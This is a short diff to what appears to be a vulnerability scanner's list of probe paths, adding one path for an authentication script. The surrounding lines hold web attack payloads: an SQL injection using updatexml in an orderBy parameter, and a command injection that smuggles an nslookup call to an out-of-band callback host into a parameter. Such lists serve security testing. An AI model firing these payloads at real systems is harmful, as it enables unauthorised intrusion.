@@ -374,3 +374,4 @@
 /mdiy/dict/listExcludeApp?query=1&dictType=1&orderBy=1/**/or/**/updatexml(1,concat(0x7e,md5(
 /mdiy/dict/listExcludeApp.do?query=1&dictType=1&orderBy=1/**/or/**/updatexml(1,concat(0x7e,md5(
 /rc/?command=shutdown&param=$(nslookup+{{randstr}}.{{interactsh-url}})
+/actions/authenticate.php
